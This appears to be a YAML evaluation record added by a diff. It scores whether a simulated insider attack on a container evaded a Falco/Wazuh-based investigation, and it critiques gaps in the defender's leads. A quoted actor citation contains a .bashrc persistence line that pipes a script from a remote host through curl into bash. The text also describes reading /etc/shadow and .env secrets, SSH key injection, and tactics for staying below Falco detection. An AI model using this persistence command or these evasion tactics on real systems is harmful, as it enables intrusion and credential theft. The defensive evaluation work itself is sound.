@@ -1,0 +1,81 @@
+outcome: survived
+outcome_rationale: |
+  All three leads returned results consistent with the oracle's projected events. Position 0 (shell-spawn-history) projected the focal 100001 event; the defender found 18 identical events over 7 days — consistent with the attack story's entry blending into existing noise. Position 1 (alerts-around-event) projected only the focal 100001 event; the defender found 12 rule 100002 events that resolved as sshd FPs (dup2, normal SSH session setup), consistent with the oracle's absence of attack-generated events in that window. Position 2 (reverse-shell-events) projected empty; the defender found only the same sshd FP events already characterized in l-003 — again consistent, because the attack's post-exec phase (credential reads, .bashrc write, bash-native ping sweep) produces no Falco events by design. No lead tested whether post-exec container activity occurred. The benign disposition rests entirely on Falco silence, and the attack was constructed to be silent to Falco.
+encounter_analysis: |
+  **l-001 / shell-spawn-history-baseline (position 0)**
+  Goal: establish whether this container has a history of similar shell spawns consistent with a dev/ops baseline. Oracle projected the focal 100001 event (implying history would look like identical events). Defender found 18 rule 100001 events over 7 days, all with identical `bash -c whoami` cmdline, clustered in bursts. The oracle is consistent: under the attack story, M's exec adds one event to an existing run of identical probes, indistinguishable from the automated baseline. The history finding anchored the defender's benign conclusion ("recurring bash -c whoami matches automated monitoring-probe pattern") but never tested whether the 14:25:22 event specifically came from the same source as the prior 17. Result: consistent with projection.
+
+  **l-002 / alerts-around-event (position 1)**
+  Goal: identify co-occurring alerts that could indicate an intrusion chain. Oracle projected only the focal 100001 event — no additional attack-generated events in the ±15m window, because the attack's post-exec phase produces none. Defender found 12 rule 100002 events (Falco: STDOUT/STDIN redirected to network connection) starting 4 seconds before the focal alert. These turned out to be sshd dup2 FPs for normal SSH session setup. The oracle's projection of zero non-100001 events is consistent with the attack — those 100002 events are pre-existing SSH traffic unrelated to M's docker exec. Critically, the defender interpreted absence of non-sshd anomalous alerts as confirmation that no post-exec activity occurred, but this inference was never tested. Result: consistent with projection.
+
+  **l-003 / reverse-shell-alert-detail (position 2)**
+  Goal: characterize the rule 100002 events found in l-002. Oracle projected empty events, consistent with the attack (M uses docker exec, not a reverse shell; the 100002 events are pre-existing SSH FPs). Defender found 8 events all from sshd, using dup2, with inbound SSH from Docker-internal 172.22.0.10. This correctly characterizes the 100002 events as FPs, and is fully consistent with the oracle's empty projection for attack-generated content. The defender then drew the broad conclusion: "No non-sshd process involved; connection is inbound SSH on port 22 from Docker-internal IP; no outbound C2 pattern" — from which it concluded h-002 was strongly refuted. This conclusion is correct as a characterization of the 100002 events, but is incorrectly extended to cover the entire post-exec phase; the lead only addressed rule 100002 events, not whether other unalerted activity occurred. Result: consistent with projection (empty attack-generated events matched).
+
+  **Synthesis.** The oracle projected no events beyond the focal 100001 alert because the attack's post-exec operations — reading `/workspace/.env`, `/etc/shadow`, writing `.bashrc`, injecting an SSH key, running a bash-native ping sweep — are all below Falco's detection surface. Every lead returned results consistent with this projection. The defender's benign verdict rests on: (a) the 18-event baseline history, and (b) the resolved sshd FPs in rule 100002. Neither tests whether post-exec container activity occurred. The attack story survived because it was designed to operate entirely within the defender's blind spots: Falco covers process execution and socket connections but not file read events or small write events, and no FIM or host-process-history lead was dispatched.
+defender_findings:
+  - type: lead-set
+    subject_anchor: no-lead-exists
+    subject_topic: post-exec container filesystem and process-history coverage
+    finding: |
+      The investigation dispatched no lead against FIM events, container filesystem state, or host-level process history. The attack's entire post-initial-exec phase — reading `/workspace/.env` and `/etc/shadow`, writing a callback stub to `/root/.bashrc`, injecting an SSH public key, and running a bash-native ping sweep — produces zero Falco syscall alerts by design. The defender's lead set covered only Falco alert streams (rule 100001 and 100002 history), leaving the post-exec phase entirely untested. As the actor framing notes, "the subsequent operations (file reads, .bashrc edit, bash-native ping sweep) do not trigger the reverse-shell rule (100002) or file-integrity rules because: reads generate no Falco write events; the .bashrc write is a single small edit."
+
+      A lead targeting recently modified files (e.g., `/root/.bashrc`, `/root/.ssh/authorized_keys`) or container bash command history via the `host-query` system would be load-bearing for this attack class. No such lead appeared in either loop.
+    citations:
+      - source: actor
+        quote: |
+          The subsequent operations (file reads, .bashrc edit, bash-native ping sweep) do not trigger the reverse-shell rule (100002) or file-integrity rules because: reads generate no Falco write events; the .bashrc write is a single small edit that does not match outbound connection patterns; the ping sweep uses bash builtins and system ping rather than any tool Falco flags by rule.
+      - source: investigation
+        quote: |
+          l-001|1|shell-spawn-history-baseline|v-001||h-001,h-002|wazuh|falco-container-shell-history|container_name=target-endpoint|7d
+          l-002|1|surrounding-alerts-context|v-001||h-001,h-002|wazuh|alerts-around-event|container_name=target-endpoint t0=2026-05-07T14:25:22Z|±15m
+          l-003|2|reverse-shell-alert-detail|v-001||h-001,h-002|wazuh|falco-reverse-shell-events|container_name=target-endpoint rule_id=100002 t0=2026-05-07T14:25:18Z|±5m
+      - source: projected_telemetry
+        quote: |
+          position: 2
+          system: wazuh
+          template: falco-reverse-shell-events
+          events: []
+  - type: analyze-discipline
+    subject_anchor: l-003
+    subject_topic: inferring absence of post-exec activity from Falco alert silence
+    finding: |
+      The ANALYZE step for l-003 concluded "no non-sshd process involved" from the rule 100002 characterization and extended this to a broad claim: "No escalating commands, no persistence, no lateral movement." This inference is unsupported — l-003 resolved the 100002 events as sshd FPs, which is correct, but says nothing about whether other post-exec activity occurred outside Falco's coverage window. Falco alert silence for reads and small writes is structural, not evidential; the inference "Falco would have fired if anything had happened" fails for precisely the operations the attack relies on.
+
+      The h-002 resolution `+ → --` with rationale "no non-sshd process involved; connection is inbound SSH on port 22 from Docker-internal IP; no outbound C2 pattern" treats the absence of Falco events as positive evidence of no adversarial activity, conflating the scope of l-003 (did the 100002 events come from sshd?) with the scope of h-002 (was an unauthorized shell obtained via any mechanism?).
+    citations:
+      - source: investigation
+        quote: |
+          h-002  + → --   [l-003 r1 severe ⟂ no non-sshd process involved; connection is inbound SSH on port 22 from Docker-internal IP; no outbound C2 pattern]
+      - source: investigation
+        quote: |
+          No escalating commands, no persistence, no lateral movement
+      - source: actor
+        quote: |
+          The operation mimics a developer doing routine container inspection and configuration adjustment — the exact activity for which this container and this exec privilege exist.
+  - type: observability
+    subject_anchor: host-query
+    subject_topic: container process-history and filesystem telemetry not queried
+    finding: |
+      The `host-query` system was available in this environment but no lead was dispatched to it. Under this attack class — an insider using docker exec to obtain a root shell and then performing read/write operations on container-local files — the load-bearing observability surface is container process history (what commands ran after `bash -c whoami`?) and recently modified files (`/root/.bashrc`, `/root/.ssh/authorized_keys`). These signals exist in the host-level layer, not in the Falco alert stream. The investigation's three leads all queried the Wazuh/Falco alert stream exclusively, leaving the `host-query` surface unexercised for this case.
+    citations:
+      - source: investigation
+        quote: |
+          l-001|1|shell-spawn-history-baseline|v-001||h-001,h-002|wazuh|falco-container-shell-history
+          l-002|1|surrounding-alerts-context|v-001||h-001,h-002|wazuh|alerts-around-event
+          l-003|2|reverse-shell-alert-detail|v-001||h-001,h-002|wazuh|falco-reverse-shell-events
+      - source: actor
+        quote: |
+          M creates /root/.ssh/ if absent, then appends their personal SSH public key to /root/.ssh/authorized_keys with chmod 600. [...] M appends a one-liner to /root/.bashrc: (curl -s http://203.0.113.44:4444/beacon.sh | bash) 2>/dev/null &
+actor_observations:
+  - type: framing-choice
+    subject_anchor: cover
+    subject_topic: blending into 18-event automated-probe baseline
+    observation: |
+      The actor correctly identified that the 18-event recurring `bash -c whoami` history in this environment provides structural cover. By issuing the same one-shot recon command first, M's exec event is indistinguishable from the existing automated probe cadence. The defender's lead l-001 found "all cmdline=bash -c whoami; clustered bursts; consistent with automated health-check probe" and anchored the benign hypothesis on this pattern — exactly the cover the attack relies on. The actor did not need to suppress or modify any alert; the baseline itself absorbed the event.
+  - type: framing-choice
+    subject_anchor: entry-vector
+    subject_topic: docker exec attribution gap versus SSH
+    observation: |
+      The defender misattributed the shell spawn's entry mechanism to SSH from 172.22.0.10 (Docker-internal), reasoning from the co-occurring sshd 100002 events. The actual entry was docker exec from the host — a mechanism that leaves no in-container parent visible and produces loginuid=-1 and pname=null, identical to the SSH-proxied scenario. The actor's observation that "Docker exec inherits neither the calling user's login session nor a visible parent process name inside the container's namespace. Every legitimate docker exec produces exactly these field values" proved correct: the defender could not distinguish between the two entry paths from container-namespace telemetry alone, and resolved the question in the attacker's favor.
+confidence: |
+  Confidence in the outcome (survived) is high — all three leads returned results structurally consistent with the oracle's projections, and the post-exec phase was demonstrably untested. The analyze-discipline finding rests on the single phrase "No escalating commands, no persistence, no lateral movement" from the investigation's loop-decision text; a human reviewer should verify this phrase represents the full analytical basis for the benign conclusion and was not accompanied by any out-of-band check not recorded in investigation.md. The observability finding assumes `host-query` could surface container process history or recently modified files; if `host-query`'s actual capability in this deployment is limited to host-level (not container-level) file/process introspection, the finding's strength weakens to a gap in available tooling rather than a gap in lead dispatch.
